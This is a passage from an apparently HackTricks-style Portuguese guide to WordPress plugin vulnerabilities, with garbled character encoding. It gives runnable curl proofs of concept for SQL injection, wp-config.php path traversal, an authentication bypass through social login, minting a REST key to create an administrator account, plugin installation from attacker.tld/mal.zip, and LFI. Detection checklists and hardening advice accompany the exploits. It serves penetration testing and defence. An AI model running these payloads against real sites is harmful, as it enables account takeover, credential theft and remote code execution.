#### Explora√ß√£o

1. Obtenha um nonce v√°lido:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. Injete SQL arbitr√°rio abusando de `parentid`:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
A resposta revela o resultado da consulta injetada ou altera o banco de dados, provando SQLi.


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

Outra tarefa, **downloadcustomfile**, permitia que visitantes baixassem **qualquer arquivo no disco** via path traversal. O sink vulner√°vel est√° localizado em `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` √© controlado pelo atacante e concatenado **sem sanitiza√ß√£o**.  Novamente, a √∫nica barreira √© um **CSRF nonce** que pode ser obtido na p√°gina do curr√≠culo.

#### Explora√ß√£o
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
O servidor responde com o conte√∫do de `wp-config.php`, leaking DB credentials and auth keys.

## Tomada de conta n√£o autenticada via Social Login AJAX fallback (Jobmonster Theme <= 4.7.9)

Many themes/plugins ship "social login" helpers exposed via admin-ajax.php. If an unauthenticated AJAX action (wp_ajax_nopriv_...) trusts client-supplied identifiers when provider data is missing and then calls wp_set_auth_cookie(), this becomes a full authentication bypass.

Typical flawed pattern (simplified)
```php
public function check_login() {
// ... request parsing ...
switch ($_POST['using']) {
case 'fb':     /* set $user_email from verified Facebook token */ break;
case 'google': /* set $user_email from verified Google token   */ break;
// other providers ...
default: /* unsupported/missing provider ‚Äì execution continues */ break;
}

// FALLBACK: trust POSTed "id" as email if provider data missing
$user_email = !empty($user_email)
? $user_email
: (!empty($_POST['id']) ? esc_attr($_POST['id']) : '');

if (empty($user_email)) {
wp_send_json(['status' => 'not_user']);
}

$user = get_user_by('email', $user_email);
if ($user) {
wp_set_auth_cookie($user->ID, true); // üî• logs requester in as that user
wp_send_json(['status' => 'success', 'message' => 'Login successfully.']);
}
wp_send_json(['status' => 'not_user']);
}
// add_action('wp_ajax_nopriv_<social_login_action>', [$this, 'check_login']);
```
Por que √© explor√°vel

- Acess√≠vel sem autentica√ß√£o via admin-ajax.php (a√ß√£o wp_ajax_nopriv_‚Ä¶).
- N√£o h√° verifica√ß√µes de nonce/capability antes de mudan√ßa de estado.
- Falta verifica√ß√£o do provedor OAuth/OpenID; o default branch aceita entrada do atacante.
- get_user_by('email', $_POST['id']) seguido de wp_set_auth_cookie($uid) autentica o solicitante como qualquer endere√ßo de email existente.

Exploitation (unauthenticated)

- Pr√©-requisitos: o atacante consegue acessar /wp-admin/admin-ajax.php e sabe/adivinha um email de usu√°rio v√°lido.
- Defina o provedor como um valor n√£o suportado (ou omita) para atingir o default branch e passar id=<victim_email>.
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: victim.tld
Content-Type: application/x-www-form-urlencoded

action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com
```

```bash
curl -i -s -X POST https://victim.tld/wp-admin/admin-ajax.php \
-d "action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com"
```
Indicadores de sucesso esperados

- HTTP 200 com corpo JSON como {"status":"success","message":"Login successfully."}.
- Set-Cookie: wordpress_logged_in_* para o usu√°rio v√≠tima; requisi√ß√µes subsequentes s√£o autenticadas.

Encontrando o nome da action

- Inspecione o tema/plugin procurando por registros add_action('wp_ajax_nopriv_...', '...') no c√≥digo de social login (ex.: framework/add-ons/social-login/class-social-login.php).
- Procure por wp_set_auth_cookie(), get_user_by('email', ...) dentro dos handlers AJAX.

Checklist de detec√ß√£o

- Web logs mostrando POSTs n√£o autenticados para /wp-admin/admin-ajax.php com a action social-login e id=<email>.
- Respostas 200 com o JSON de sucesso imediatamente antes de tr√°fego autenticado vindo do mesmo IP/User-Agent.

Endurecimento

- N√£o derive identidade a partir de entrada do cliente. Aceite apenas emails/IDs que se originem de um token/ID do provedor validado.
- Exija nonces CSRF e checagens de capability mesmo para helpers de login; evite registrar wp_ajax_nopriv_ a menos que estritamente necess√°rio.
- Valide e verifique respostas OAuth/OIDC no servidor; rejeite providers ausentes/inv√°lidos (sem fallback para o POST id).
- Considere desabilitar temporariamente o social login ou aplicar um patch virtual na borda (bloquear a action vulner√°vel) at√© corrigir.

Patched behaviour (Jobmonster 4.8.0)

- Removed the insecure fallback from $_POST['id']; $user_email must originate from verified provider branches in switch($_POST['using']).

## Escalada de privil√©gios n√£o autenticada via emiss√£o de token/chave REST em identidade previs√≠vel (OttoKit/SureTriggers ‚â§ 1.0.82)

Alguns plugins exp√µem endpoints REST que emitem ‚Äúconnection keys‚Äù reutiliz√°veis ou tokens sem verificar as capacidades do chamador. Se a rota autentica apenas com base em um atributo previs√≠vel (ex.: username) e n√£o vincula a chave a um usu√°rio/sess√£o com checagens de capability, qualquer atacante n√£o autenticado pode emitir uma chave e invocar a√ß√µes privilegiadas (cria√ß√£o de conta admin, a√ß√µes de plugin ‚Üí RCE).

- Vulnerable route (example): sure-triggers/v1/connection/create-wp-connection
- Flaw: accepts a username, issues a connection key without current_user_can() or a strict permission_callback
- Impact: comprometimento total ao encadear a chave emitida a a√ß√µes internas privilegiadas

PoC ‚Äì emitir uma connection key e us√°-la
```bash
# 1) Obtain key (unauthenticated). Exact payload varies per plugin
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/connection/create-wp-connection" \
-H 'Content-Type: application/json' \
--data '{"username":"admin"}'
# ‚Üí {"key":"<conn_key>", ...}

# 2) Call privileged plugin action using the minted key (namespace/route vary per plugin)
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/users" \
-H 'Content-Type: application/json' \
-H 'X-Connection-Key: <conn_key>' \
--data '{"username":"pwn","email":"p@t.ld","password":"p@ss","role":"administrator"}'
```
Por que √© explor√°vel
- Rota REST sens√≠vel protegida apenas por prova de identidade de baixa entropia (username) ou aus√™ncia de permission_callback
- Sem enforcement de capability; a chave emitida √© aceita como bypass universal

Checklist de detec√ß√£o
- Grep o c√≥digo do plugin por register_rest_route(..., [ 'permission_callback' => '__return_true' ])
- Qualquer rota que emita tokens/chaves com base em identidade fornecida na requisi√ß√£o (username/email) sem vincul√°-la a um usu√°rio autenticado ou capability
- Procure rotas subsequentes que aceitem o token/chave emitido sem checagens de capability no lado do servidor

Mitiga√ß√µes
- Para qualquer rota REST privilegiada: exigir permission_callback que aplique current_user_can() para a capability requerida
- N√£o crie chaves de longa dura√ß√£o a partir de identidade fornecida pelo cliente; se necess√°rio, emita tokens de curta dura√ß√£o vinculados ao usu√°rio ap√≥s autentica√ß√£o e reavalie as capabilities no uso
- Valide o contexto de usu√°rio do chamador (wp_set_current_user n√£o √© suficiente sozinho) e rejeite requisi√ß√µes onde !is_user_logged_in() || !current_user_can(<cap>)

---

## Uso indevido do Nonce ‚Üí instala√ß√£o arbitr√°ria de plugin sem autentica√ß√£o (FunnelKit Automations ‚â§ 3.5.3)

Nonces previnem CSRF, n√£o autoriza√ß√£o. Se o c√≥digo trata a aprova√ß√£o do nonce como sinal verde e ent√£o ignora checagens de capability para opera√ß√µes privilegiadas (por exemplo, install/activate plugins), atacantes n√£o autenticados podem satisfazer um requisito de nonce fraco e alcan√ßar RCE instalando um plugin com backdoor ou vulner√°vel.

- Caminho vulner√°vel: plugin/install_and_activate
- Falha: verifica√ß√£o fraca do hash do nonce; aus√™ncia de current_user_can('install_plugins'|'activate_plugins') uma vez que o nonce ‚Äúpasse‚Äù
- Impacto: comprometimento total via instala√ß√£o/ativa√ß√£o arbitr√°ria de plugins

PoC (shape depends on plugin; illustrative only)
```bash
curl -i -s -X POST https://victim.tld/wp-json/<fk-namespace>/plugin/install_and_activate \
-H 'Content-Type: application/json' \
--data '{"_nonce":"<weak-pass>","slug":"hello-dolly","source":"https://attacker.tld/mal.zip"}'
```
Detection checklist
- REST/AJAX handlers que modificam plugins/themes usando apenas wp_verify_nonce()/check_admin_referer() e sem verifica√ß√£o de capability
- Qualquer caminho de c√≥digo que define $skip_caps = true ap√≥s valida√ß√£o do nonce

Hardening
- Sempre trate nonces apenas como tokens CSRF; aplique verifica√ß√µes de capability independentemente do estado do nonce
- Exigir current_user_can('install_plugins') e current_user_can('activate_plugins') antes de alcan√ßar o c√≥digo do instalador
- Rejeitar acesso n√£o autenticado; evitar expor nopriv AJAX actions para fluxos privilegiados

---

## SQLi n√£o autenticado via par√¢metro s (search) em a√ß√µes depicter-* (Depicter Slider ‚â§ 3.6.1)

M√∫ltiplas a√ß√µes depicter-* consumiam o par√¢metro s (search) e o concatenavam em queries SQL sem parametriza√ß√£o.

- Par√¢metro: s (search)
- Falha: concatena√ß√£o direta de strings em cl√°usulas WHERE/LIKE; sem prepared statements/sanitiza√ß√£o
- Impacto: exfiltra√ß√£o do banco de dados (usu√°rios, hashes), movimenta√ß√£o lateral

PoC
```bash
# Replace action with the affected depicter-* handler on the target
curl -G "https://victim.tld/wp-admin/admin-ajax.php" \
--data-urlencode 'action=depicter_search' \
--data-urlencode "s=' UNION SELECT user_login,user_pass FROM wp_users-- -"
```
Checklist de detec√ß√£o
- Grep por depicter-* action handlers e pelo uso direto de $_GET['s'] ou $_POST['s'] em SQL
- Revise consultas customizadas passadas para $wpdb->get_results()/query() que concatenam s

Endurecimento
- Use sempre $wpdb->prepare() ou placeholders do wpdb; rejeite metacaracteres inesperados no servidor
- Adicione uma allowlist estrita para s e normalize para o charset/tamanho esperado

---

## N√£o autenticado Local File Inclusion via caminho de template/arquivo n√£o validado (Kubio AI Page Builder ‚â§ 2.5.1)

Aceitar caminhos controlados pelo atacante em um par√¢metro de template sem normaliza√ß√£o/conten√ß√£o permite ler arquivos locais arbitr√°rios, e √†s vezes executar c√≥digo se arquivos PHP/logs inclu√≠veis forem carregados em tempo de execu√ß√£o.

- Parameter: __kubio-site-edit-iframe-classic-template
- Falha: sem normaliza√ß√£o/allowlisting; traversal permitido
- Impacto: divulga√ß√£o de segredos (wp-config.php), potencial RCE em ambientes espec√≠ficos (log poisoning, includable PHP)

PoC ‚Äì ler wp-config.php
```bash
curl -i "https://victim.tld/?__kubio-site-edit-iframe-classic-template=../../../../wp-config.php"
```
Checklist de detec√ß√£o
- Qualquer handler que concatene request paths em sinks include()/require()/read sem conten√ß√£o via realpath()
- Procure por padr√µes de traversal (../) que alcancem fora do diret√≥rio de templates pretendido

Endurecimento
- Imponha templates permitidos; resolva com realpath() e exija str_starts_with(realpath(file), realpath(allowed_base))
- Normalize a entrada; rejeite sequ√™ncias de traversal e caminhos absolutos; use sanitize_file_name() somente para nomes de arquivo (n√£o para caminhos completos)


## Refer√™ncias

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset ‚Äì delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments ‚â§ 5.6.1 ‚Äì Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation ‚Äì Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)
- [Unauthenticated Broken Authentication Vulnerability in WordPress Jobmonster Theme](https://patchstack.com/articles/unauthenticated-broken-authentication-vulnerability-in-wordpress-jobmonster-theme/)
- [Q3 2025‚Äôs most exploited WordPress vulnerabilities and how RapidMitigate blocked them](https://patchstack.com/articles/q3-2025s-most-exploited-wordpress-vulnerabilities-and-how-patchstacks-rapidmitigate-blocked-them/)
- [OttoKit (SureTriggers) ‚â§ 1.0.82 ‚Äì Privilege Escalation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/suretriggers/vulnerability/wordpress-suretriggers-1-0-82-privilege-escalation-vulnerability)
- [FunnelKit Automations ‚â§ 3.5.3 ‚Äì Unauthenticated arbitrary plugin installation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/wp-marketing-automations/vulnerability/wordpress-recover-woocommerce-cart-abandonment-newsletter-email-marketing-marketing-automation-by-funnelkit-plugin-3-5-3-missing-authorization-to-unauthenticated-arbitrary-plugin-installation-vulnerability)
- [Depicter Slider ‚â§ 3.6.1 ‚Äì Unauthenticated SQLi via s parameter (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/depicter/vulnerability/wordpress-depicter-slider-plugin-3-6-1-unauthenticated-sql-injection-via-s-parameter-vulnerability)
- [Kubio AI Page Builder ‚â§ 2.5.1 ‚Äì Unauthenticated LFI (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/kubio/vulnerability/wordpress-kubio-ai-page-builder-plugin-2-5-1-unauthenticated-local-file-inclusion-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
